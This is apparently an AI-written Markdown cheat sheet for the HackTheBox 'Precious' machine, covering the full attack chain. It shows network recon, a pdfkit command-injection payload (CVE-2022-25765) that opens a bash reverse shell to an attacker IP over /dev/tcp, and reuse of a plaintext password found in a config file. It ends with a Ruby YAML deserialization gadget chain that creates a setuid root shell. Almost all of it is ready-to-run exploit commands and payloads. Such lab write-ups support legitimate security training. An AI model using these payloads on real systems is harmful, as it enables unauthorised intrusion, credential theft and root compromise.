Here’s a complete Markdown-formatted command and exploitation guide for **HTB: Precious**, organized by phase and with clear explanations 🧠💻

---

# 🧵 HTB: Precious – Command Cheat Sheet

## 🔍 Recon Phase

### Nmap Full Port + Version Scan
```bash
nmap -p- --min-rate 10000 10.10.11.189
nmap -p 22,80 -sCV 10.10.11.189
```

### Add Host Entry
```bash
echo "10.10.11.189 precious.htb" | sudo tee -a /etc/hosts
```

### [FFUF](HTTP) Subdomain Fuzzing
```bash
ffuf -u http://10.10.11.189 -H "Host: FUZZ.precious.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```

### Feroxbuster Directory Brute Force
```bash
feroxbuster -u http://precious.htb
```

---

## 🖨️ Exploiting PDF Generation (Command Injection)

### Exiftool Analysis
```bash
exiftool output.pdf
# -> Shows "Generated by pdfkit v0.8.6"
```

### Vulnerability
- `pdfkit v0.8.6` vulnerable to command injection (CVE-2022-25765)

### POC to Leak `id`
```bash
http://10.10.14.6/?name=%20`id`
```

### Reverse Shell (Bash)
```bash
# Listener
nc -lnvp 443

# Payload (submit in URL field of form)
http://10.10.14.6/?name=%20`bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"`
```

### Shell Upgrade
```bash
script /dev/null -c bash
# ^Z
stty raw -echo; fg
reset
# Terminal type? screen
```

---

## 👤 Escalating to User `henry`

### Look for Creds in `.bundle`
```bash
cat ~/.bundle/config
# => username: henry, password: Q3c1AqGHtoI0aXAYFH
```

### `su` to Henry
```bash
su - henry
# OR
sshpass -p 'Q3c1AqGHtoI0aXAYFH' ssh henry@precious.htb
```

---

## ⚙️ Privilege Escalation via Unsafe YAML

### Check Sudo Access
```bash
sudo -l
# => (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

### Vulnerable Line
```ruby
YAML.load(File.read("dependencies.yml"))
```

### Create Exploit Payload
```yaml
# dependencies.yml
---
- !ruby/object:Gem::Installer
  i: x
- !ruby/object:Gem::SpecFetcher
  i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
        read: 0
        header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
        socket: &1 !ruby/object:Gem::RequestSet
          sets: !ruby/object:Net::WriteAdapter
            socket: !ruby/module 'Kernel'
            method_id: :system
          git_set: cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
        method_id: :resolve
```

### Run Exploit
```bash
cd /dev/shm
sudo ruby /opt/update_dependencies.rb
```

### Get Root Shell
```bash
/tmp/rootbash -p
id
cat /root/root.txt
```

---

## 🔬 Beyond Root – PDFKit Debug + Local Access Fix

### Problem
- Server fails to fetch internal URLs like `http://127.0.0.1` or `http://precious.htb`.

### Fix
```bash
echo "127.0.0.1 precious.htb" | sudo tee -a /etc/hosts
```